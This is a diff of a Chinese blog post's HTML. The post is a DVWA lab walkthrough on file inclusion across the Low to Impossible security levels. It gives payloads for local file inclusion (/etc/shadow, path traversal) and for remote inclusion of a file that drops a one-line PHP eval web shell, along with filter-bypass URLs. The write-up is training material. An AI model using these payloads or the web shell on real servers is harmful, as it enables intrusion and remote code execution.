@@ -87,13 +87,13 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    11k
+                    6.7k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    10 mins.
+                    6 mins.
                 </span>
                 
                 
@@ -127,8 +127,8 @@
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DVWA\vulnerabilities\fi\source\</span><br></pre></td></tr></table></figure>
-<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>直接点击<code>file1.php、file2.php、file3.php</code>可以相应跳转到不同的界面</p>
+            <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><pre><code>DVWA\vulnerabilities\fi\source\
+</code></pre><h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>直接点击<code>file1.php、file2.php、file3.php</code>可以相应跳转到不同的界面</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-3.png" alt="4-3"></p>
 <h2 id="开启allow-url-include"><a href="#开启allow-url-include" class="headerlink" title="开启allow_url_include"></a>开启allow_url_include</h2><p>进入之后如果<code>allow_url_include</code>没有开启，会出现如下画面</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-1.png" alt="4-1"></p>
@@ -136,31 +136,44 @@
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-2.png" alt="4-2"></p>
 <p>修改该配置文件中的<code>allow_url_include = On</code>，然后重启服务就可以了</p>
 <h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+
+?&gt;
+</code></pre>
 <p>从代码中可以看出来，对接受的<code>page</code>参数没有经过任何的处理，我们现在分别点击初始页面中的<code>file1.php、file2.php、file3.php</code>，发现<code>URL</code>中改变的只有page参数</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-4.png" alt="4-4"></p>
 <p>既然page没有任何限制，现在就能读取其他文件，操作开始</p>
 <p>1.本地文件包含</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=/etc/shadow</span><br></pre></td></tr></table></figure>
-<p>没有找到文件，那就说明这台服务器并不是Linux服务器</p>
+<pre><code>http://192.168.0.105/dvwa/vulnerabilities/fi/?page=/etc/shadow
+</code></pre><p>没有找到文件，那就说明这台服务器并不是Linux服务器</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-5.png" alt="4-5"></p>
 <p>在服务器根目录下写一个test.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+phpinfo();
+?&gt;
+</code></pre>
 <p>使用<code>绝对路径</code>访问test.php，访问成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=C:\phpstudy\www\test.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-6.png" alt="4-6"></p>
+<pre><code>http://192.168.0.105/dvwa/vulnerabilities/fi/?page=C:\phpstudy\www\test.php
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-6.png" alt="4-6"></p>
 <p>使用<code>相对路径</code>访问test.php，访问成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=../../../../../../phpstudy/www/test.php</span><br></pre></td></tr></table></figure>
-<p>Ps：多个<code>../</code>是为了能够保证到达当下盘的根目录；斜杠和反斜杠都可以</p>
+<pre><code>http://192.168.0.105/dvwa/vulnerabilities/fi/?page=../../../../../../phpstudy/www/test.php
+</code></pre><p>Ps：多个<code>../</code>是为了能够保证到达当下盘的根目录；斜杠和反斜杠都可以</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-7.png" alt="4-7"></p>
 <p>2.远程文件包含</p>
 <p>当服务器的php配置中，选项<code>allow_url_fopen</code>与<code>allow_url_include</code>为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行</p>
 <p>直接试一下访问百度，直接访问成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=http://www.baidu.com</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-8.png" alt="4-8"></p>
+<pre><code>http://192.168.0.105/dvwa/vulnerabilities/fi/?page=http://www.baidu.com
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-8.png" alt="4-8"></p>
 <p>在另外一台<code>远程主机</code>上写入一个txt文件，内容为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$file = fopen(&apos;shell02.php&apos;,&apos;w&apos;);</span><br><span class="line">	$string = &apos;&lt;?php eval($_POST[pass]); ?&gt;&apos;;</span><br><span class="line">	fputs($file,$string);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-13.png" alt="4-13"></p>
+<pre><code>&lt;?php 
+    $file = fopen(&#39;shell02.php&#39;,&#39;w&#39;);
+    $string = &#39;&lt;?php eval($_POST[pass]); ?&gt;&#39;;
+    fputs($file,$string);
+?&gt;
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-13.png" alt="4-13"></p>
 <p>现在就可以远程包含这个文件（我的远程主机IP为：192.168.43.84）</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-14.png" alt="4-14"></p>
 <p>再去查看，已经生成了shell文件</p>
@@ -169,27 +182,63 @@
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-16.png" alt="4-16"></p>
 <p>后续难度只要能绕过黑白名单的限制，就可以同上面方法一样去远程包含、生成shell、菜刀连接，不再赘述</p>
 <h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+
+// Input validation
+$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );
+$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );
+
+?&gt;
+</code></pre>
 <p>从代码中可以看出来，利用<code>str_replace()</code>函数对<code>http://、https://、../、..\</code>这4个重要的关键字符进行了过滤，但是绕过规则也比较简单，直接<code>双写</code>或者<code>大小写</code>就可以解决</p>
 <p>虽然<code>../</code>无法绕过，但影响也不大，因为绝对路径还可以使用，试一下双写绕过，可以成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=hthttp://tp://www.baidu.com</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-9.png" alt="4-9"></p>
+<pre><code>http://192.168.0.105/dvwa/vulnerabilities/fi/?page=hthttp://tp://www.baidu.com
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-9.png" alt="4-9"></p>
 <p>试一下大小写绕过，也可以成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=HtTp://www.baidu.com</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-10.png" alt="4-10"></p>
+<pre><code>http://192.168.0.105/dvwa/vulnerabilities/fi/?page=HtTp://www.baidu.com
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-10.png" alt="4-10"></p>
 <h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, $file ) &amp;&amp; $file != <span class="string">"include.php"</span> ) &#123;</span><br><span class="line">	<span class="comment">// This isn't the page we want!</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+
+// Input validation
+if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {
+    // This isn&#39;t the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+}
+
+?&gt;
+</code></pre>
 <p>源码中可以看出来通过<code>fnmatch()</code>函数限制了输入的参数必须以<code>file</code>开头，但是我们还是可以绕过</p>
 <p>1.file协议</p>
 <p>因为使用浏览器打开一个本地文件时，使用的是file协议，刚好以file开头</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file://C:/phpstudy/WWW/file.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-11.png" alt="4-11"></p>
+<pre><code>file://C:/phpstudy/WWW/file.txt
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-11.png" alt="4-11"></p>
 <p>现在构造URL</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file://C:/phpstudy/www/test.php</span><br></pre></td></tr></table></figure>
-<p>成功访问</p>
+<pre><code>http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file://C:/phpstudy/www/test.php
+</code></pre><p>成功访问</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-12.png" alt="4-12"></p>
 <h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">"include.php"</span> &amp;&amp; $file != <span class="string">"file1.php"</span> &amp;&amp; $file != <span class="string">"file2.php"</span> &amp;&amp; $file != <span class="string">"file3.php"</span> ) &#123;</span><br><span class="line">	<span class="comment">// This isn't the page we want!</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+
+// Only allow include.php or file{1..3}.php
+if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) {
+    // This isn&#39;t the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+}
+
+?&gt;
+</code></pre>
 <p>Impossible难度只允许<code>include.php</code>或者<code>file{1..3}.php</code>，虽然不灵活，但是却彻底杜绝文件包含漏洞</p>
 <hr>
 <p>参考文章：</p>
